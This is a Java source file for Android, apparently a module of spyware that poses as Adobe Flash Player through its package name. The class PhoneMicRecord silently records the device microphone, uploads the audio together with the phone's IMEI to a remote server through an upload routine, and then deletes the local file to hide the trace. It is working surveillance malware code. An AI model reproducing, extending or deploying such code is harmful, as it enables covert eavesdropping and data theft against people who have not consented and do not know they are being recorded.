package com.adobe.flashplayer.data;

import java.io.File;
import java.io.FileInputStream;
import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;
import com.adobe.flashplayer.Public;
import androidx.core.content.ContextCompat;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.UploadData;
import com.adobe.flashplayer.MyLog;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.ContentResolver;
import com.adobe.flashplayer.network.NetworkUitls;


public class PhoneMicRecord implements Runnable{

    private static String TAG = "[ljg]PhoneMicRecord";

    private static int MaxAudioRecordTime = 3600;
    private Context context;
    private int seconds;


    public PhoneMicRecord(Context context, int seconds){
        this.context = context;
        this.seconds = seconds;
    }



    public void run(){
        try{
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.RECORD_AUDIO);
            if (granted == PackageManager.PERMISSION_GRANTED) {

                if (seconds <= 0 || seconds >= MaxAudioRecordTime) {
                    seconds = 60;
                }

                String datetime = Utils.formatCurrentDateInFileName();
                String filename = Public.LOCAL_PATH_NAME + datetime + "_" + Public.MICAUDIORECORD_FILE_NAME + ".amr";

                MediaRecorder recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                recorder.setOutputFile(filename);
                recorder.prepare();
                recorder.start();

                int cnt = 0;
                while (cnt < seconds) {
                    Thread.sleep(1000);
                    cnt++;
                }

                recorder.stop();
                recorder.reset();
                recorder.release();

                if (NetworkUitls.isNetworkAvailable(context) == false) {
                    return;
                }


                File file = new File(filename);
                FileInputStream fin = new FileInputStream(file);
                int filesize = (int) file.length();
                int filenamelen = file.getName().getBytes().length;
                int sendsize = filesize + 4 + filenamelen + 4;
                byte[] sendbuf = new byte[sendsize];
                byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                System.arraycopy(file.getName().getBytes(), 0, sendbuf, 4, filenamelen);
                byte[] bytefilesize = Utils.intToBytes(filesize);
                System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
                fin.read(sendbuf, 4 + filenamelen + 4, filesize);

                fin.close();

                UploadData.upload(sendbuf, sendsize, Public.CMD_DATA_MICAUDIORECORD, Public.IMEI);

                file.delete();

                Log.e(TAG, "mic audio record time:" + seconds + " ok");

                return;
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("micAudioRecord exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }
    }
}

